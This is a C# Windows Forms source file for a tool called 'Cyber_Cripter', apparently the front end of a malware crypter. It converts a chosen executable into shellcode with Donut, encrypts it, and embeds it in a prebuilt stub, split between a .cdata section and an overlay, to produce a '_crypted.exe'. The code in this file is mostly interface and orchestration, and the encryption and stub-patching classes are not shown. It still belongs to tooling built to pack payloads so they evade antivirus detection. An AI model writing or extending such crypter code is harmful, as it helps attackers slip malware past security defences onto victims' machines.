using System;
using System.IO;
using System.Windows.Forms;

namespace Cyber_Cripter
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void browseFile_Click(object sender, EventArgs e)
        {
            using (var dlg = new OpenFileDialog { Filter = "Executable files (*.exe)|*.exe|All files (*.*)|*.*" })
            {
                if (dlg.ShowDialog() == DialogResult.OK)
                {
                    fileRoute.Text = dlg.FileName;
                    statusLabel.Text = "";
                }
            }
        }

        private void encryptBtn_Click(object sender, EventArgs e)
        {
            string inputPath = fileRoute.Text;
            if (string.IsNullOrWhiteSpace(inputPath) || !File.Exists(inputPath)
                || inputPath == "File to encrypt path")
            {
                Show("Select a valid input executable first.", error: true);
                return;
            }

            string appDir       = AppDomain.CurrentDomain.BaseDirectory;
            string templatePath = Path.Combine(appDir, "Resources", "stub_template.exe");
            if (!File.Exists(templatePath))
            {
                Show("stub_template.exe not found at:\n" + templatePath +
                     "\nBuild it via stub\\build.bat (see stub\\README.md).", error: true);
                return;
            }

            string outputDir  = Path.Combine(appDir, "outputs");
            string outputName = Path.GetFileNameWithoutExtension(inputPath) + "_crypted.exe";
            string outputPath = Path.Combine(outputDir, outputName);

            encryptBtn.Enabled = false;
            Show("Converting payload to shellcode (donut)...");

            try
            {
                byte[] shellcode = Donut.Convert(inputPath);
                Show("Shellcode " + shellcode.Length + " B. Encrypting & patching stub...");

                byte[] template = File.ReadAllBytes(templatePath);
                var report = StubBuilder.Build(template, shellcode, outputPath);

                Show(string.Format(
                    "Done.\n" +
                    "  Output:      {0}\n" +
                    "  Shellcode:   {1} B  ->  Ciphertext: {2} B\n" +
                    "  Embedded:    {3} B (.cdata)   Overlay: {4} B\n" +
                    "  Build ts:    {5}\n" +
                    "  Derived key: {6}",
                    report.OutputPath, report.ShellcodeBytes, report.CiphertextBytes,
                    report.Half1Bytes, report.Half2Bytes, report.Timestamp, report.KeyHex));
            }
            catch (Exception ex)
            {
                Show("Failed: " + ex.Message, error: true);
            }
            finally
            {
                encryptBtn.Enabled = true;
            }
        }

        private void Show(string msg, bool error = false)
        {
            statusLabel.ForeColor = error
                ? System.Drawing.Color.IndianRed
                : System.Drawing.Color.LightGreen;
            statusLabel.Text = msg;
            statusLabel.Refresh();
        }
    }
}
